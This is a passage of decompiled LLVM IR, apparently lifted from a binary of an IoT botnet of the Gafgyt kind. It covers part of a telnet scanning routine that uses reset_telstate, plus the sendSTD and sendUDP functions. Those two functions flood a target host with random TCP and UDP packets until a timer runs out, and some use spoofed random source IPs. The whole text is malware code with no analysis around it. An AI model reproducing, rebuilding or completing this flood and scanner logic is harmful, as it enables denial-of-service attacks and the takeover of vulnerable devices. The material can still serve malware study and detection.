dec_label_pc_ddec:                                ; preds = %dec_label_pc_ce3c
  store i32 %storemerge553, i32* @r4, align 4
  %v2_ddf4 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_de08 = load i32, i32* @r4, align 4
  %v2_de14 = mul i32 %v0_de08, 28
  %v2_de1c = add i32 %v2_d560, %v2_de14
  %v2_de20 = inttoptr i32 %v2_de1c to i32*
  store i32 %v2_ddf4, i32* %v2_de20, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v1_de3c = inttoptr i32 %v2_cdf0 to i32*
  %v2_de3c = load i32, i32* %v1_de3c, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_de50 = call i32 @__libc_send(i32 %v2_de3c, i32* bitcast ([5 x i8]* @global_var_1add4.349 to i32*), i32 4, i32 16384)
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v2_de6c = load i32, i32* %v1_de3c, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_de80 = call i32 @__libc_send(i32 %v2_de6c, i32* bitcast ([8 x i8]* @global_var_1addc.351 to i32*), i32 7, i32 16384)
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v2_de9c = load i32, i32* %v1_de3c, align 4
  store i32 %v2_de9c, i32* @r4, align 4
  %v2_dea4 = load i32, i32* bitcast ([507 x i8]** @global_var_2c488.354 to i32*), align 4
  store i32 %v2_dea4, i32* @r5, align 4
  store i32 %v2_dea4, i32* %r3.global-to-local, align 4
  %v1_deb0 = inttoptr i32 %v2_dea4 to i8*
  %v3_deb4 = call i32 @strlen(i8* %v1_deb0)
  %v0_debc = load i32, i32* @r4, align 4
  %v0_dec0 = load i32, i32* @r5, align 4
  store i32 %v3_deb4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %tmp44 = inttoptr i32 %v0_dec0 to i32*
  %v6_decc = call i32 @__libc_send(i32 %v0_debc, i32* %tmp44, i32 %v3_deb4, i32 16384)
  store i32 %v6_decc, i32* %r3.global-to-local, align 4
  %v1_ded4 = icmp slt i32 %v6_decc, 0
  br i1 %v1_ded4, label %dec_label_pc_dedc, label %dec_label_pc_df00

dec_label_pc_dedc:                                ; preds = %dec_label_pc_ddec
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v3_def8 = call i32 @reset_telstate(i32 %v2_cdf0, i32 %v3_cc88, i32 %v3_cde4)
  br label %dec_label_pc_df5c

dec_label_pc_df00:                                ; preds = %dec_label_pc_ddec
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  %v2_df1c = add i32 %v2_cdec, %v2_d560
  store i32 %v2_df1c, i32* %r3.global-to-local, align 4
  %v1_df20 = inttoptr i32 %v2_df1c to i32*
  %v2_df20 = load i32, i32* %v1_df20, align 4
  store i32 %v2_df20, i32* %r3.global-to-local, align 4
  %v1_df24 = add i32 %v2_df20, 25
  store i32 %v1_df24, i32* @r4, align 4
  %v2_df2c = call i32 @__GI_time(i32* null)
  store i32 %v2_df2c, i32* %r3.global-to-local, align 4
  %v0_df34 = load i32, i32* @r4, align 4
  %v3_df34 = icmp ult i32 %v0_df34, %v2_df2c
  br i1 %v3_df34, label %dec_label_pc_df3c, label %dec_label_pc_df5c

dec_label_pc_df3c:                                ; preds = %dec_label_pc_df00
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v3_df58 = call i32 @reset_telstate(i32 %v2_cdf0, i32 %v3_cc88, i32 %v3_cde4)
  br label %dec_label_pc_df5c

dec_label_pc_df5c:                                ; preds = %dec_label_pc_d548, %dec_label_pc_d694, %dec_label_pc_d934, %dec_label_pc_dd8c, %dec_label_pc_df00, %dec_label_pc_ce3c, %dec_label_pc_d130, %dec_label_pc_dedc, %dec_label_pc_ddc8, %dec_label_pc_dd3c, %dec_label_pc_dc70, %dec_label_pc_dc48, %dec_label_pc_dbbc, %dec_label_pc_dac0, %dec_label_pc_da9c, %dec_label_pc_da3c, %dec_label_pc_d970, %dec_label_pc_d90c, %dec_label_pc_d8e4, %dec_label_pc_d820, %dec_label_pc_d7fc, %dec_label_pc_d79c, %dec_label_pc_d6d0, %dec_label_pc_d66c, %dec_label_pc_d644, %dec_label_pc_d584, %dec_label_pc_d524, %dec_label_pc_d490, %dec_label_pc_d46c, %dec_label_pc_d2c0, %dec_label_pc_d29c, %dec_label_pc_d104, %dec_label_pc_d0ac, %dec_label_pc_df3c
  %v1_df60 = add nuw nsw i32 %storemerge553, 1
  store i32 %v1_df60, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v5_df74 = icmp slt i32 %v1_df60, %arg2
  br i1 %v5_df74, label %dec_label_pc_cdd8, label %dec_label_pc_cdcc

; uselistorder directives
  uselistorder i32 %v1_df60, { 2, 1, 0 }
  uselistorder i32 %v3_deb4, { 1, 0 }
  uselistorder i32* %v1_db00, { 1, 0, 2, 3 }
  uselistorder i32 %v3_da14, { 1, 0 }
  uselistorder i32 %v3_d774, { 1, 0 }
  uselistorder i32 %v5_d3fc, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge610, { 1, 0 }
  uselistorder i32 %v0_cf84, { 1, 0 }
  uselistorder i32 %v2_ced8, { 0, 3, 2, 1 }
  uselistorder i32 %v2_ced4, { 1, 0, 2, 3 }
  uselistorder i8* %v2_ceac, { 2, 1, 0, 3 }
  uselistorder i32 %v2_cea8, { 0, 2, 1, 3, 4, 5, 6, 7 }
  uselistorder i8 %v2_ce5c, { 1, 0 }
  uselistorder i32 %v0_ce20, { 1, 0 }
  uselistorder i32* %v1_cdf8, { 1, 0, 2 }
  uselistorder i32 %v2_cdf4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_cdf0, { 77, 76, 75, 74, 78, 79, 81, 80, 60, 59, 62, 61, 64, 65, 66, 68, 67, 63, 70, 69, 71, 73, 72, 54, 53, 52, 51, 56, 55, 58, 57, 47, 46, 48, 4, 50, 49, 41, 40, 39, 38, 43, 42, 45, 44, 34, 33, 35, 3, 37, 36, 28, 27, 26, 25, 19, 20, 21, 23, 22, 24, 29, 30, 32, 31, 6, 8, 7, 9, 10, 11, 13, 12, 16, 1, 2, 15, 14, 0, 18, 17, 5 }
  uselistorder i32 %v2_cdec, { 0, 1, 2, 3, 4, 5, 7, 8, 6 }
  uselistorder i32 %v3_cde4, { 81, 82, 80, 78, 79, 77, 76, 75, 61, 62, 60, 65, 66, 73, 72, 71, 69, 70, 68, 67, 64, 74, 63, 59, 58, 56, 57, 54, 55, 53, 52, 51, 47, 48, 46, 50, 49, 45, 44, 42, 43, 40, 41, 39, 38, 37, 33, 34, 32, 36, 35, 31, 30, 28, 29, 27, 25, 26, 23, 22, 24, 21, 20, 19, 18, 17, 11, 9, 10, 8, 7, 6, 5, 4, 16, 15, 14, 13, 12, 3, 2, 1, 0 }
  uselistorder i32 %storemerge553, { 1, 4, 5, 6, 7, 10, 9, 8, 3, 2, 0 }
  uselistorder i32 %v2_d560, { 3, 0, 4, 1, 5, 2 }
  uselistorder i32 %v2_d2e8, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v2_d188, { 1, 0 }
  uselistorder i32 %v1_cdb0, { 1, 2, 0 }
  uselistorder i32 %v1_cd8c, { 2, 1, 0 }
  uselistorder i32 %storemerge462, { 1, 0 }
  uselistorder i32 %v2_ccac, { 1, 0 }
  uselistorder i32 %v3_cc88, { 4, 3, 5, 6, 7, 9, 8, 10, 12, 11, 13, 16, 15, 14, 18, 0, 19, 17, 1, 22, 23, 24, 21, 2, 20 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-612, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 86, 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 16, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 30, 28, 29, 31, 32, 33, 34, 35, 38, 36, 37, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 53, 50, 51, 54, 55, 56, 52, 59, 57, 58, 60, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 123, 120, 121, 124, 125, 126, 122, 129, 127, 128, 130, 133, 131, 132, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 177, 152, 153, 154, 155, 158, 156, 157, 159, 160, 161, 162, 163, 164, 165, 166, 168, 167, 169, 170, 171, 172, 173, 174, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 175, 87, 88, 89, 102, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 176, 103, 104, 105, 107, 106, 109, 108 }
  uselistorder i32* %r2.global-to-local, { 51, 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 42, 43, 44, 45, 46, 47, 48, 49, 50, 104, 52, 53, 105, 54, 55 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 13, 14, 15, 16, 17, 18, 8, 9, 10, 11 }
  uselistorder i32 (i32)* @contains_success, { 1, 0 }
  uselistorder i32 ptrtoint ([3 x i8*]* @global_var_2c498.342 to i32), { 2, 3, 0, 4, 1, 5 }
  uselistorder i32* bitcast ([3 x i8]* @global_var_1adb8.340 to i32*), { 1, 0 }
  uselistorder i32 ptrtoint ([6 x i8*]* @global_var_2c48c.338 to i32), { 2, 3, 0, 4, 1, 5 }
  uselistorder i32 (i32)* @contains_fail, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @reset_telstate, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 115, { 1, 0, 2 }
  uselistorder i32 %arg2, { 5, 4, 2, 7, 6, 0, 1, 3, 8, 9 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_df5c, { 33, 4, 7, 8, 3, 9, 10, 11, 12, 13, 14, 15, 16, 2, 17, 18, 19, 20, 21, 22, 1, 23, 24, 25, 0, 26, 27, 28, 29, 30, 6, 31, 32, 5 }
  uselistorder label %dec_label_pc_d2fc, { 1, 0 }
  uselistorder label %dec_label_pc_d2c0, { 1, 0 }
  uselistorder label %dec_label_pc_ce3c, { 1, 0 }
  uselistorder label %dec_label_pc_cdd8, { 1, 0 }
  uselistorder label %dec_label_pc_cdcc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ccd0, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_df80 = load i32, i32* @fp, align 4
  store i32 %v3_df80, i32* %stack_var_-16, align 4
  store i32 57224, i32* %stack_var_-4, align 4
  %v13_df80 = ptrtoint i32* %stack_var_-16 to i32
  %v2_df84 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_df84, i32* @fp, align 4
  store i32 %arg3, i32* %stack_var_-208, align 4
  %v0_dfa4 = call i32 @socket()
  %v2_dfb4 = call i32 @__GI_time(i32* null)
  %v1_dfc8 = call i32 @__GI_gethostbyname(i32 %arg1)
  store i32 16, i32* @r2, align 4
  %v2_dfe4 = bitcast i32* %stack_var_-52 to i8*
  %v3_dfe4 = call i32 @__GI_memset(i8* %v2_dfe4, i32 0)
  %v1_dfec = add i32 %v1_dfc8, 16
  %v2_dfec = inttoptr i32 %v1_dfec to i32*
  %v3_dfec = load i32, i32* %v2_dfec, align 4
  %v1_dff0 = inttoptr i32 %v3_dfec to i32*
  %v2_dff0 = load i32, i32* %v1_dff0, align 4
  %v2_dff8 = ptrtoint i32* %stack_var_-48 to i32
  %v1_e000 = add i32 %v1_dfc8, 12
  %v2_e000 = inttoptr i32 %v1_e000 to i32*
  %v3_e000 = load i32, i32* %v2_e000, align 4
  store i32 %v3_e000, i32* @r2, align 4
  %v3_e010 = call i32 @bcopy(i32 %v2_dff0, i32 %v2_dff8, i32 %v3_e000)
  %v1_e018 = add i32 %v1_dfc8, 8
  %v2_e018 = inttoptr i32 %v1_e018 to i32*
  %v3_e018 = load i32, i32* %v2_e018, align 4
  %v3_e020 = urem i32 %v3_e018, 65536
  store i32 %v3_e020, i32* %stack_var_-52, align 4
  %v2_e054 = ptrtoint i32* %stack_var_-196 to i32
  %v3_e0d0 = bitcast i32* %stack_var_-52 to %sockaddr*
  %v2_e090 = add i32 %v13_df80, -180
  br label %dec_label_pc_e050

dec_label_pc_e050:                                ; preds = %dec_label_pc_e10c, %entry
  %storemerge3 = phi i32 [ 0, %entry ], [ %v1_e110, %dec_label_pc_e10c ]
  store i32 %v2_e054, i32* @r0, align 4
  store i32 ptrtoint ([36 x i8*]* @global_var_1af88.392 to i32), i32* @r1, align 4
  store i32 144, i32* @r2, align 4
  %v0_e068 = call i32 @memcpy()
  %v0_e06c = call i32 @random()
  %tmp = icmp ult i32 %storemerge3, 50
  br i1 %tmp, label %dec_label_pc_e10c, label %dec_label_pc_e0ac

dec_label_pc_e0ac:                                ; preds = %dec_label_pc_e050
  %v2_e07c = urem i32 %v0_e06c, 36
  %v3_e088 = mul nuw nsw i32 %v2_e07c, 4
  %v2_e094 = add i32 %v2_e090, %v3_e088
  %v1_e098 = inttoptr i32 %v2_e094 to i32*
  %v2_e098 = load i32, i32* %v1_e098, align 4
  %v5_e0bc = inttoptr i32 %v2_e098 to i32*
  %v6_e0bc = call i32 @__libc_send(i32 %v0_dfa4, i32* %v5_e0bc, i32 65, i32 0)
  %v4_e0d0 = call i32 @__libc_connect(i32 %v0_dfa4, %sockaddr* %v3_e0d0, i32 16)
  %v2_e0d8 = call i32 @__GI_time(i32* null)
  %v3_e0e4 = load i32, i32* %stack_var_-208, align 4
  %v2_e0e8 = add i32 %v3_e0e4, %v2_dfb4
  %v5_e0f0 = icmp slt i32 %v2_e0d8, %v2_e0e8
  br i1 %v5_e0f0, label %dec_label_pc_e104, label %dec_label_pc_e0f4

dec_label_pc_e0f4:                                ; preds = %dec_label_pc_e0ac
  %v1_e0f8 = call i32 @__libc_close(i32 %v0_dfa4)
  %v1_e100 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_e104:                                ; preds = %dec_label_pc_e0ac
  br label %dec_label_pc_e10c

dec_label_pc_e10c:                                ; preds = %dec_label_pc_e050, %dec_label_pc_e104
  %stack_var_-24.0 = phi i32 [ %storemerge3, %dec_label_pc_e050 ], [ 0, %dec_label_pc_e104 ]
  %v1_e110 = add i32 %stack_var_-24.0, 1
  br label %dec_label_pc_e050

; uselistorder directives
  uselistorder i32 %storemerge3, { 1, 0 }
  uselistorder i32 %v3_e000, { 1, 0 }
  uselistorder i32 %v1_dfc8, { 2, 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 0, 2, 1 }
  uselistorder i32 65, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 1, 0 }
  uselistorder label %dec_label_pc_e10c, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_e124 = load i32, i32* @r4, align 4
  %v6_e124 = load i32, i32* @fp, align 4
  store i32 57644, i32* %stack_var_-4, align 4
  %v2_e128 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_e128, i32* @fp, align 4
  %v2_e12c = ptrtoint i32* %stack_var_-144 to i32
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-76, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_e154 = icmp eq i32 %arg2, 0
  br i1 %v2_e154, label %dec_label_pc_e15c, label %dec_label_pc_e17c

dec_label_pc_e15c:                                ; preds = %entry
  %v0_e15c = call i32 @rand_cmwc()
  %v3_e164 = mul i32 %v0_e15c, 65536
  store i32 %v3_e164, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e1a0

dec_label_pc_e17c:                                ; preds = %entry
  %v3_e184 = urem i32 %arg2, 65536
  store i32 %v3_e184, i32* %r3.global-to-local, align 4
  %v1_e18c = call i32 @htons(i32 %v3_e184)
  br label %dec_label_pc_e1a0

dec_label_pc_e1a0:                                ; preds = %dec_label_pc_e15c, %dec_label_pc_e17c
  %v2_e1a4 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_e1a4, i32* %r3.global-to-local, align 4
  %v3_e1b0 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-72)
  store i32 %v3_e1b0, i32* %r3.global-to-local, align 4
  %v2_e1b8 = icmp eq i32 %v3_e1b0, 0
  br i1 %v2_e1b8, label %dec_label_pc_e1c0, label %dec_label_pc_e814

dec_label_pc_e1c0:                                ; preds = %dec_label_pc_e1a0
  %v2_e1c0 = ptrtoint i32* %stack_var_-76 to i32
  %v2_e1c4 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_e1c4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-68, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %v7_e1e4 = icmp eq i32 %arg4, 32
  br i1 %v7_e1e4, label %dec_label_pc_e1ec, label %dec_label_pc_e380

dec_label_pc_e1ec:                                ; preds = %dec_label_pc_e1c0
  store i32 17, i32* @r2, align 4
  %v0_e1f8 = call i32 @socket()
  store i32 %v0_e1f8, i32* %r3.global-to-local, align 4
  %v2_e208 = icmp eq i32 %v0_e1f8, 0
  br i1 %v2_e208, label %dec_label_pc_e210, label %dec_label_pc_e228

dec_label_pc_e210:                                ; preds = %dec_label_pc_e1ec
  %v2_e214 = load i32, i32* @global_var_2c908.54, align 4
  store i32 %v2_e214, i32* %r3.global-to-local, align 4
  %v3_e220 = call i32 @sockprintf(i32 %v2_e214, i32 ptrtoint ([27 x i8]* @global_var_1b018.395 to i32))
  br label %dec_label_pc_e814

dec_label_pc_e228:                                ; preds = %dec_label_pc_e1ec
  %v3_e228 = load i32, i32* %stack_var_0, align 4
  %v1_e22c = add i32 %v3_e228, 1
  store i32 %v1_e22c, i32* %r3.global-to-local, align 4
  %v1_e234 = call i32 @malloc(i32 %v1_e22c)
  store i32 %v1_e234, i32* %r3.global-to-local, align 4
  %v2_e244 = icmp eq i32 %v1_e234, 0
  br i1 %v2_e244, label %dec_label_pc_e814, label %dec_label_pc_e24c

dec_label_pc_e24c:                                ; preds = %dec_label_pc_e228
  %v3_e24c = load i32, i32* %stack_var_0, align 4
  %v1_e250 = add i32 %v3_e24c, 1
  store i32 %v1_e250, i32* @r2, align 4
  store i32 %v1_e234, i32* %r3.global-to-local, align 4
  %v2_e264 = inttoptr i32 %v1_e234 to i8*
  %v3_e264 = call i32 @__GI_memset(i8* %v2_e264, i32 0)
  %v2_e270 = call i32 @makeRandomStr(i32 %v1_e234, i32 %v3_e24c)
  %v2_e278 = call i32 @__GI_time(i32* null)
  %v2_e284 = add i32 %v2_e278, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_e2c4 = inttoptr i32 %v1_e234 to i32*
  %v3_e348 = mul i32 %arg8, 4
  %v3_e358 = mul i32 %arg8, 1000
  br label %dec_label_pc_e2a0.outer

dec_label_pc_e2a0.outer:                          ; preds = %dec_label_pc_e370, %dec_label_pc_e340, %dec_label_pc_e24c
  %stack_var_-108.0.ph = phi i32 [ 0, %dec_label_pc_e24c ], [ %v1_e374, %dec_label_pc_e370 ], [ 0, %dec_label_pc_e340 ]
  %stack_var_-112.0.ph = phi i32 [ 0, %dec_label_pc_e24c ], [ %v1_e328, %dec_label_pc_e370 ], [ %v1_e328, %dec_label_pc_e340 ]
  br label %dec_label_pc_e2a0

dec_label_pc_e2a0:                                ; preds = %dec_label_pc_e2a0.outer, %dec_label_pc_e318
  %stack_var_-112.0 = phi i32 [ 0, %dec_label_pc_e318 ], [ %stack_var_-112.0.ph, %dec_label_pc_e2a0.outer ]
  %v3_e2a0 = load i32, i32* %stack_var_0, align 4
  store i32 %v2_e1c0, i32* %stack_var_-144, align 4
  store i32 %v3_e2a0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_e2c4 = call i32 @__libc_sendto(i32 %v0_e1f8, i32* %v6_e2c4, i32 %v3_e2a0, i32 0, i32 %v2_e1c0, i32 16)
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v9_e2d0 = icmp eq i32 %stack_var_-112.0, %arg6
  br i1 %v9_e2d0, label %dec_label_pc_e2d8, label %dec_label_pc_e324

dec_label_pc_e2d8:                                ; preds = %dec_label_pc_e2a0
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_e154, label %dec_label_pc_e2e4, label %dec_label_pc_e300

dec_label_pc_e2e4:                                ; preds = %dec_label_pc_e2d8
  %v0_e2e4 = call i32 @rand_cmwc()
  %v3_e2f0 = udiv i32 %v0_e2e4, 256
  %v3_e2f85 = urem i32 %v3_e2f0, 256
  store i32 %v3_e2f85, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e300

dec_label_pc_e300:                                ; preds = %dec_label_pc_e2d8, %dec_label_pc_e2e4
  %v2_e304 = call i32 @__GI_time(i32* null)
  store i32 %v2_e304, i32* %r2.global-to-local, align 4
  store i32 %v2_e284, i32* %r3.global-to-local, align 4
  %v8_e314 = icmp sgt i32 %v2_e304, %v2_e284
  br i1 %v8_e314, label %dec_label_pc_e814, label %dec_label_pc_e318

dec_label_pc_e318:                                ; preds = %dec_label_pc_e300
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e2a0

dec_label_pc_e324:                                ; preds = %dec_label_pc_e2a0
  %v1_e328 = add i32 %stack_var_-112.0, 1
  store i32 %arg7, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-108.0.ph, i32* %r2.global-to-local, align 4
  %v9_e338 = icmp eq i32 %stack_var_-108.0.ph, %arg7
  br i1 %v9_e338, label %dec_label_pc_e340, label %dec_label_pc_e370

dec_label_pc_e340:                                ; preds = %dec_label_pc_e324
  store i32 %v3_e348, i32* %r2.global-to-local, align 4
  store i32 %v3_e358, i32* %r3.global-to-local, align 4
  %v1_e360 = call i32 @usleep(i32 %v3_e358)
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e2a0.outer

dec_label_pc_e370:                                ; preds = %dec_label_pc_e324
  %v1_e374 = add i32 %stack_var_-108.0.ph, 1
  br label %dec_label_pc_e2a0.outer

dec_label_pc_e380:                                ; preds = %dec_label_pc_e1c0
  store i32 %v2_e12c, i32* %r3.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v0_e394 = call i32 @socket()
  store i32 %v0_e394, i32* %r3.global-to-local, align 4
  %v2_e3a4 = icmp eq i32 %v0_e394, 0
  br i1 %v2_e3a4, label %dec_label_pc_e3ac, label %dec_label_pc_e3c4

dec_label_pc_e3ac:                                ; preds = %dec_label_pc_e380
  %v2_e3b0 = load i32, i32* @global_var_2c908.54, align 4
  store i32 %v2_e3b0, i32* %r3.global-to-local, align 4
  %v3_e3bc = call i32 @sockprintf(i32 %v2_e3b0, i32 ptrtoint ([27 x i8]* @global_var_1b018.395 to i32))
  br label %dec_label_pc_e810

dec_label_pc_e3c4:                                ; preds = %dec_label_pc_e380
  store i32 1, i32* %stack_var_-80, align 4
  %v2_e3cc = ptrtoint i32* %stack_var_-80 to i32
  store i32 4, i32* %stack_var_-144, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 %v2_e3cc, i32* %r3.global-to-local, align 4
  %v6_e3e8 = call i32 @__GI_setsockopt(i32 %v0_e394, i32 0, i32 3, i32* nonnull %stack_var_-80, i32 4)
  store i32 %v6_e3e8, i32* %r3.global-to-local, align 4
  %v1_e3f0 = icmp slt i32 %v6_e3e8, 0
  br i1 %v1_e3f0, label %dec_label_pc_e3f8, label %dec_label_pc_e410

dec_label_pc_e3f8:                                ; preds = %dec_label_pc_e3c4
  %v2_e3fc = load i32, i32* @global_var_2c908.54, align 4
  store i32 %v2_e3fc, i32* %r3.global-to-local, align 4
  %v3_e408 = call i32 @sockprintf(i32 %v2_e3fc, i32 ptrtoint ([33 x i8]* @global_var_1b034.397 to i32))
  br label %dec_label_pc_e810

dec_label_pc_e410:                                ; preds = %dec_label_pc_e3c4
  store i32 49, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e41c

dec_label_pc_e41c:                                ; preds = %dec_label_pc_e410, %dec_label_pc_e41c
  %v1_e45426 = phi i32 [ 49, %dec_label_pc_e410 ], [ %v1_e454, %dec_label_pc_e41c ]
  %v2_e420 = call i32 @__GI_time(i32* null)
  store i32 %v2_e420, i32* %r3.global-to-local, align 4
  store i32 %v2_e420, i32* @r4, align 4
  %v0_e42c = call i32 @rand_cmwc()
  %v0_e434 = load i32, i32* @r4, align 4
  %v2_e434 = xor i32 %v0_e434, %v0_e42c
  store i32 %v2_e434, i32* %r3.global-to-local, align 4
  %v1_e43c = call i32 @srand(i32 %v2_e434)
  %v0_e440 = call i32 @random()
  store i32 %v0_e440, i32* %r3.global-to-local, align 4
  %v1_e44c = call i32 @init_rand(i32 %v0_e440)
  %v1_e454 = add nsw i32 %v1_e45426, -1
  store i32 %v1_e454, i32* %r3.global-to-local, align 4
  %v3_e460 = icmp eq i32 %v1_e45426, 0
  br i1 %v3_e460, label %dec_label_pc_e468, label %dec_label_pc_e41c

dec_label_pc_e468:                                ; preds = %dec_label_pc_e41c
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %v2_e46c = icmp eq i32 %arg4, 0
  br i1 %v2_e46c, label %dec_label_pc_e498, label %dec_label_pc_e480

dec_label_pc_e480:                                ; preds = %dec_label_pc_e468
  %v1_e484 = sub i32 32, %arg4
  store i32 %v1_e484, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_e490 = shl i32 -1, %v1_e484
  br label %dec_label_pc_e498

dec_label_pc_e498:                                ; preds = %dec_label_pc_e468, %dec_label_pc_e480
  %storemerge12 = phi i32 [ %v1_e490, %dec_label_pc_e480 ], [ 0, %dec_label_pc_e468 ]
  %v3_e498 = load i32, i32* %stack_var_0, align 4
  %v1_e49c = add i32 %v3_e498, 28
  %v1_e4ac = add i32 %v3_e498, 34
  %v3_e4b0 = and i32 %v1_e4ac, -4
  %v1_e4b8 = load i32, i32* @sp, align 4
  %v2_e4b8 = sub i32 %v1_e4b8, %v3_e4b0
  %v1_e4c8 = add i32 %v2_e4b8, 11
  %v3_e4cc = and i32 %v1_e4c8, -4
  store i32 %v3_e4cc, i32* %r2.global-to-local, align 4
  %v1_e4ec = add i32 %v3_e4cc, 20
  store i32 %v1_e4ec, i32* %r3.global-to-local, align 4
  %v5_e4f0 = inttoptr i32 %v1_e4ec to i8*
  %v3_e4f4 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_e4f4, i32* @r4, align 4
  %v1_e4fc = call i32 @GetRandomIP(i32 %storemerge12)
  store i32 %v1_e4fc, i32* %r3.global-to-local, align 4
  %v1_e508 = call i32 @htonl(i32 %v1_e4fc)
  store i32 %v1_e508, i32* %r2.global-to-local, align 4
  %v3_e510 = load i32, i32* %stack_var_0, align 4
  %v1_e514 = add i32 %v3_e510, 8
  %v1_e518 = load i32, i32* @sp, align 4
  %v2_e518 = inttoptr i32 %v1_e518 to i32*
  store i32 %v1_e514, i32* %v2_e518, align 4
  %v0_e520 = load i32, i32* @r4, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v4_e528 = inttoptr i32 %v3_e4cc to i8*
